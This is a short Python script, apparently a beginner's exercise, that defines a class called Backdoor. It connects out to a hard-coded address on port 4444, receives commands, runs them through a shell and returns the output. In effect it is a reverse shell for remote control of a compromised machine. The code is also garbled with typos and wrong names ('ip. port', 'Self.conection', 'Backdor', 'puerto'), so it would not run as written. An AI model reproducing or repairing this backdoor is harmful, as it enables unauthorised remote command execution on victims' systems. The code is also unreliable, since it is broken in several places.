from _typeshed import Self
import socket
import subprocess

class Backdoor:
    def __init__(self, ip. port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Self.conection((ip,port))

    def ejecutar_comando(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.connection.recv(1024)
            command_result = self.ejecutar_commando(command)
            self.connection.send(command_result)
        connection.close()


puerta = Backdor("192.168.88.88", 4444)
puerto.run()
